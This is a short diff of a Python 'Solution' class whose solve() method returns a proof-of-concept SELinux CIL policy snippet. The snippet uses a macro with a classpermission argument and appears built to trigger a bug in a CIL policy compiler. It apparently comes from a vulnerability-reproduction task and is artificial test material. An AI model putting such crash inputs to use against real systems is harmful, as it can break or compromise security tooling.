@@ -1,12 +1,11 @@
-import os
+from typing import Optional
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        poc = b"""
-(class myclass (perm))
-(macro m ((cp classpermission))
-    (classpermissionset s (cp))
+        poc = """
+(macro m ((p classpermission))
+    (classpermissionset s (p))
 )
-(call m (((myclass (perm)))))
+(call m ((p (file (read)))))
 """
-        return poc.strip()
+        return poc.strip().encode()
